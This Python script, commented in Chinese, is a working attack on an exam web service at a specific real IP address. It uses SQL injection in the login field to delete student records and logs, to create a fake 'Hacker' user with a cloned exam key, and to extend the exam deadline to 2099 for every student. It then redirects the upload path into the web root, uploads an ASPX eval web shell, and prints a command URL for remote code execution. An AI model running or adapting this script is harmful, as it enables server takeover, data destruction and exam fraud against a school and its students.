import requests
import base64
import re
import time

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
OLD_UID = 3707
NEW_UID = 3711
SHELL_FILENAME = "s_3711.aspx"
SHELL_CODE = r'<%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>'
WEB_ROOT = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web"

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def send_sql(desc, sql):
    print(f"[*] SQL注入: {desc}")
    injection = f"admin'; {sql}; --"
    safe_username = injection.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>pass</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        requests.post(TARGET_URL, data=soap.encode('utf-8'), headers=HEADERS, timeout=5)
    except:
        pass

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def exploit():
    print(f"=== 开始对 ID {NEW_UID} 进行全自动破解 (清理 {OLD_UID}) ===")

    # 1. 清理旧数据 (3707)
    print("\n[Step 0] 清理旧数据...")
    send_sql(f"删除用户 {OLD_UID}", f"DELETE FROM Exam2020Stu WHERE ID={OLD_UID}")
    send_sql(f"删除用户 {OLD_UID} 日志", f"DELETE FROM Exam2020Log WHERE UID={OLD_UID}")

    # 2. 创建新用户 3711 (克隆自 9207)
    # 重点：确保 ExamKey 正确
    print("\n[Step 1] 创建/更新用户 3711...")
    sql_ensure_user = f"""
    IF NOT EXISTS (SELECT * FROM Exam2020Stu WHERE ID={NEW_UID})
        INSERT INTO Exam2020Stu (ID, Code1, Name, ExamKey, Submitted)
        SELECT {NEW_UID}, '{NEW_UID}', 'Hacker{NEW_UID}', (SELECT TOP 1 ExamKey FROM Exam2020Stu WHERE ID=9207), 0
    ELSE
        UPDATE Exam2020Stu SET ExamKey=(SELECT TOP 1 ExamKey FROM Exam2020Stu WHERE ID=9207), Submitted=0 WHERE ID={NEW_UID}
    """
    send_sql(f"创建用户 {NEW_UID}", sql_ensure_user)

    # 3. 确保 Config 是解锁的
    # 使用 9207 的 ExamKey 去解锁 Config
    # 但我们为了保险，对所有 Config 都进行“大清洗” (或者至少对我们用的那个 Key)
    # UPDATE Exam2020Config SET Value='...' WHERE Name='StopTime'
    # 这样不管是用哪个 Key 查，只要 Name 对了就解锁
    # 注意：这样会影响全校学生，但这是最稳的方法。
    print("\n[Step 2] 全局解锁 Config...")
    send_sql("全局延长考试时间 (2099)", "UPDATE Exam2020Config SET Value='2099-12-31 23:59:59' WHERE Name='StopTime'")

    path_sql = WEB_ROOT.replace("'", "''")
    send_sql(f"全局劫持上传路径 ({WEB_ROOT})", f"UPDATE Exam2020Config SET Value='{path_sql}' WHERE Name='AnswerPath'")

    time.sleep(2)

    # 4. 上传
    print(f"\n[Step 3] 上传 WebShell ({SHELL_FILENAME})...")
    encoded_filename = to_html_entities(SHELL_FILENAME)
    file_b64 = base64.b64encode(SHELL_CODE.encode('utf-8')).decode('utf-8')

    soap_upload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <UploadAnswer xmlns="http://tempuri.org/">
          <uid>{NEW_UID}</uid>
          <aid>1</aid> <filename>{encoded_filename}</filename>
          <file>{file_b64}</file>
        </UploadAnswer>
      </soap:Body>
    </soap:Envelope>"""

    try:
        resp = requests.post(TARGET_URL, data=soap_upload.encode('utf-8'), headers=HEADERS, timeout=10)

        # 调试响应
        if "OK" in resp.text:
            print("    [+] 上传成功 (Server returned OK)")
        elif "UploadAnswerResult" in resp.text:
             res_match = re.search(r"<UploadAnswerResult>(.*?)</UploadAnswerResult>", resp.text)
             if res_match:
                 print(f"    [+] 上传响应: {res_match.group(1)}")
        else:
            print(f"    [?] 响应异常: {resp.text[:200]}")

    except Exception as e:
        print(f"    [!] 上传异常: {e}")
        return

    # 5. 获取路径
    print(f"\n[Step 4] 获取 Shell 路径...")
    soap_list = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetUploadFiles xmlns="http://tempuri.org/">
          <uid>{NEW_UID}</uid>
        </GetUploadFiles>
      </soap:Body>
    </soap:Envelope>"""

    try:
        resp_list = requests.post(TARGET_URL, data=soap_list.encode('utf-8'), headers=HEADERS, timeout=10)

        if "UploadeFiles" not in resp_list.text:
            print("    [!] 列表为空或 XML 解析失败，可能上传未成功。")
            # print(resp_list.text[:300])

        match = re.search(f"<FullPath>(.*?{SHELL_FILENAME})</FullPath>", resp_list.text)

        if match:
            full_path = match.group(1)
            print(f"    [+] 物理路径: {full_path}")

            web_root_marker = r"Eiven.EXE.Web\Eiven.EXE.Web"
            if web_root_marker in full_path:
                rel_path = full_path.split(web_root_marker)[1]
                url_path = rel_path.replace("\\", "/")

                # 处理 URL 编码
                import urllib.parse
                parts = url_path.split('/')
                encoded_parts = [urllib.parse.quote(p) for p in parts]
                encoded_url_path = "/".join(encoded_parts)

                shell_url = f"http://120.55.241.236:999{encoded_url_path}"

                print(f"\n[★ SUCCESS] Shell URL: {shell_url}")
                print(f"    CMD: {shell_url}?c=var%20d=new%20ActiveXObject(%22WScript.Shell%22);var%20o=d.Exec(%22cmd%20/c%20whoami%22);Response.Write(o.StdOut.ReadAll());")
            else:
                print(f"    [!] 路径不在 Web 目录下。")
        else:
            print("    [-] 未找到文件路径。")

    except Exception as e:
        print(f"    [!] 获取路径异常: {e}")

if __name__ == "__main__":
    exploit()
